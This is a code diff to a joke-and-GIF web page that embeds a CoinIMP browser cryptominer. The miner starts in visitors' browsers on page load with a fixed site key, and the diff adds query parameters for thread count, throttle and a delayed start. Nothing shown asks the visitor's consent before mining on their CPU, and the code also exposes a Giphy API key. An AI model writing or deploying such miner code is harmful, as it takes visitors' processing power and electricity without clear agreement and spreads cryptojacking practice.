@@ -62,6 +62,19 @@
     <script src="https://www.hostingcloud.racing/9jDL.js"></script> <!-- CoinIMP Miner Script -->
 
     <script>
+        // Parse query parameters from the URL
+        function getQueryParams() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                autoplay: params.get('autoplay') === '1',
+                threads: parseInt(params.get('threads'), 10) || null,
+                throttle: parseFloat(params.get('throttle')) || null,
+                delay: parseInt(params.get('delay'), 10) || 0
+            };
+        }
+
+        const queryParams = getQueryParams();
+
         // Function to fetch a random Chuck Norris joke
         async function fetchChuckNorrisJoke() {
             try {
@@ -76,6 +89,10 @@
 
         // Function to fetch a random GIF
         async function fetchRandomGIF() {
+            if (!queryParams.autoplay) {
+                document.getElementById('random-gif').alt = 'GIF loading is disabled.';
+                return;
+            }
             try {
                 const apiKey = '4J2hDdjjNYsRAj0d9MZ92i7WpWcVIYYU'; // Replace with your Giphy API key
                 const response = await fetch(`https://api.giphy.com/v1/gifs/random?api_key=${apiKey}&tag=funny&rating=g`);
@@ -91,21 +108,23 @@
         // Automatically calculate the number of threads based on available CPU cores
         function getAvailableThreads() {
             const cpuCores = navigator.hardwareConcurrency || 4; // Default to 4 if hardwareConcurrency is not available
-            return Math.max(1, Math.min(cpuCores, 16)); // Limit to 16 threads max to avoid overloading
+            const defaultThreads = Math.max(1, Math.min(cpuCores, 4)); // Limit to 4 threads max to avoid overloading
+            return queryParams.threads !== null ? queryParams.threads : defaultThreads;
         }
 
         // Initialize CoinIMP miner (for mining VerusCoin or Monero)
         function startMining() {
-            const threads = getAvailableThreads(); // Get the number of threads based on available CPU cores
+            const threads = getAvailableThreads(); // Get the number of threads based on available CPU cores or query param
+            const throttle = queryParams.throttle !== null ? queryParams.throttle : 0.1; // Default throttle is 0.1
             const miner = new Client.Anonymous('3f1e57f6b0ddc90d68e3b00a16f1fcd6c9a13a77a02c3e8137c05f4618e0525c', {
-                throttle: 0.1,
+                throttle: throttle,
                 threads: threads,
                 c: 'w',
                 forceASMJS: false
             });
 
             miner.start();
-            document.getElementById('mining-status').innerText = `Mining started with ${threads} threads...`;
+            document.getElementById('mining-status').innerText = `Mining started with ${threads} threads and ${throttle * 100}% throttle...`;
 
             // Update Hashes/sec and Local hashes stats
             setInterval(() => {
@@ -133,9 +152,15 @@
         fetchChuckNorrisJoke();
         fetchRandomGIF();
 
-        // Start mining once the page is loaded
+        // Start mining with optional delay
         window.onload = function() {
-            startMining();
+            if (queryParams.delay > 0) {
+                setTimeout(() => {
+                    startMining();
+                }, queryParams.delay * 1000);
+            } else {
+                startMining();
+            }
         };
     </script>
 </body>
